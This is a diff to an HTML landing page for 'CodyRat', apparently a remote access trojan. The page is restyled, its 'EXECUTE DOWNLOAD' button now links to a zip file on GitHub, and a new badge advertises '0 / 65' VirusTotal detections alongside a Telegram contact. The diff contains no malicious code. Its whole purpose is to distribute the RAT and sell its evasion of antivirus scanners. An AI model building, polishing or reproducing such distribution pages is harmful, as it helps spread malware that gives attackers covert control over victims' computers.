@@ -5,15 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CodyRat</title>
     <style>
-        body { margin: 0; background: #050505; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        body { margin: 0; background: #050505; color: #00ff41; font-family: 'Courier New', monospace; overflow-x: hidden; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         canvas { position: absolute; top: 0; left: 0; z-index: 0; }
-        .ui { position: relative; z-index: 1; text-align: center; width: 90%; flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .ui { position: relative; z-index: 1; text-align: center; width: 90%; flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px 0; }
         .header { font-size: 32px; font-weight: bold; margin-bottom: 10px; text-shadow: 0 0 8px #00ff41; }
         .typewriter { font-size: 18px; margin-bottom: 40px; height: 20px; }
         .cursor { animation: blink 1s infinite; }
         @keyframes blink { 50% { opacity: 0; } }
-        .btn { padding: 25px 50px; border: 2px solid #00ff41; background: rgba(0, 255, 65, 0.05); color: #00ff41; font-size: 20px; cursor: pointer; text-transform: uppercase; transition: 0.3s; width: 100%; max-width: 350px; }
+        
+        .btn { padding: 25px 50px; border: 2px solid #00ff41; background: rgba(0, 255, 65, 0.05); color: #00ff41; font-size: 20px; cursor: pointer; text-transform: uppercase; transition: 0.3s; width: 100%; max-width: 350px; margin-bottom: 30px; text-decoration: none; display: inline-block; }
         .btn:hover { background: #00ff41; color: #050505; box-shadow: 0 0 15px #00ff41; }
+
+        /* VirusTotal Styles Adjusted */
+        .vt-container { margin-top: auto; padding-bottom: 60px; text-align: center; }
+        .vt-link-btn { 
+            display: inline-block; padding: 15px 30px; border: 1px solid #00ff41; background: transparent; 
+            color: #00ff41; font-size: 16px; text-decoration: none; cursor: pointer; transition: 0.3s;
+        }
+        .vt-link-btn:hover { background: #00ff41; color: #050505; }
+        
+        .vt-score { 
+            width: 80px; height: 80px; border-radius: 50%; border: 4px solid #00ff41; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            margin: 0 auto 15px auto; color: #00ff41; font-weight: bold;
+        }
+        .vt-score-val { font-size: 18px; }
+        .vt-score-label { font-size: 10px; }
+
         .tg-container { position: absolute; bottom: 20px; width: 100%; text-align: center; }
         .tg { color: #808080; font-size: 14px; text-decoration: none; }
     </style>
@@ -23,8 +41,18 @@
     <div class="ui">
         <div class="header">CodyRat</div>
         <div class="typewriter" id="text"></div>
-        <button class="btn" onclick="window.location.href='https://github.com/unt1tledead/codyrat/raw/main/Kakashki.zip'">EXECUTE DOWNLOAD</button>
+        
+        <a href="https://github.com/unt1tledead/codyrat/raw/main/Kakashki.zip" class="btn">EXECUTE DOWNLOAD</a>
     </div>
+
+    <div class="vt-container">
+        <div class="vt-score">
+            <div class="vt-score-val">0 / 65</div>
+            <div class="vt-score-label">Детекты VT</div>
+        </div>
+        <a href="https://www.virustotal.com/gui/file/0b9c70c8d75d447337158ea96899e0d63e9356961c3f9f7193b4956d11d51ba2/summary" class="vt-link-btn" target="_blank">VirusTotal</a>
+    </div>
+
     <div class="tg-container">
         <a href="https://t.me/mynewdead" class="tg">TG: @mynewdead</a>
     </div>
@@ -88,7 +116,10 @@
             if (pause) return; 
 
             const txt = texts[i];
-            document.getElementById('text').innerHTML = txt.substring(0, j) + '<span class="cursor">_</span>';
+            const el = document.getElementById('text');
+            if(el) {
+                el.innerHTML = txt.substring(0, j) + '<span class="cursor">_</span>';
+            }
             
             if(!del && j < txt.length) {
                 j++;
